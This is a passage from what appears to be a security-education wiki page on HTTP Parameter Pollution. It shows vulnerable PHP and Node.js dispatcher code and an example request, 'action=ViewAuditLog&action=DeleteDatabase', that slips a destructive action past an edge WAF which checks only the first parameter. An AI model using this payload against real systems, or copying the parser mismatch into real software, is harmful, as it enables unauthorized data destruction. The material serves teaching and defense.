public function dispatchAction(Request $request) 
{
    // [1]
    // [2]
    // In raw PHP, $_GET implicitly overwrites previous keys, so the LAST occurrence wins automatically.
    // [3]
    // [4]
    $finalAction = $request->query('action');

    if ($finalAction === 'DeleteDatabase') 
    {
        $this->systemService->destroyDatabase();
        return response('Database Destroyed', 200);
    }
    
    return response('Action Executed', 200);
}

// Inside the custom Edge Router Proxy (Hypothetical Context):
// Extracts the first matched regex group for optimization.
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// Inside the monolithic backend application
router.post('/api/v1/dispatch', async (req, res) => {
    // [1]
    // [2]
    let actionParam = req.query.action;
    
    // [3]
    // [4]
    let finalAction = Array.isArray(actionParam) ? actionParam[actionParam.length - 1] : actionParam;

    if (finalAction === 'DeleteDatabase') {
        await systemService.destroyDatabase();
        return res.send('Database Destroyed');
    }
    
    res.send('Action Executed');
});

// Inside the custom Edge WAF Middleware (Hypothetical Context):
// let action = new URLSearchParams(url).get('action'); // returns the FIRST occurrence
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The backend microservice acts as a monolithic RPC-style dispatcher, routing operations based entirely on a query string parameter rather than distinct RESTful paths, \[2] To enforce perimeter security, the enterprise relies on an Edge Gateway or WAF to perform Deep Packet Inspection (DPI) on the query string and enforce RBAC rules, \[3] The architecture suffers from parser desynchronization. The Edge WAF was written in a language or utilizes a library (e.g., Go's `url.Values.Get()`) that evaluates duplicate HTTP parameters by explicitly returning the _first_ value supplied in the string, \[4] The downstream backend framework is written in a language (like PHP) that natively overwrites previous keys, inherently returning the _last_ value, or the developer explicitly selects the last value from the array. The WAF secures one state, while the backend executes another, permanently fracturing the authorization boundary

```http
// 1. Attacker (Low-Privilege User) targets the monolithic dispatch endpoint.
// 2. Attacker crafts an HTTP Parameter Pollution payload, placing the safe action first, and the malicious action last.

POST /api/v1/dispatch?action=ViewAuditLog&action=DeleteDatabase HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <low_privilege_user_token>
Content-Type: application/json

{"target": "production_db"}

// 3. Edge Gateway evaluates: action == "ViewAuditLog". User has permission. Passes request to backend.
// 4. Backend application evaluates: action == "DeleteDatabase". Executes administrative action.

HTTP/1.1 200 OK
Content-Type: text/plain

Database Destroyed
```
{% endstep %}

{% step %}
To unify access control policies across the organization, security engineers lifted the authorization logic out of the monolithic backend and implemented it at the Edge WAF layer. Because the backend utilized a single unified dispatcher endpoint, the WAF relied on parsing the HTTP query string to deduce user intent. The WAF engineers optimized their parsing logic to read the first parameter occurrence. Meanwhile, the legacy monolithic backend natively evaluated parameters by overriding preceding keys, resulting in a last-occurrence-wins behavior. The attacker exploited this parser desynchronization by submitting a polluted request. The WAF inspected the first parameter, verified the benign action, and granted network ingress. The backend application parsed the exact same request, extracted the latter parameter, and blindly executed the catastrophic administrative operation, entirely circumventing the centralized perimeter defense
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
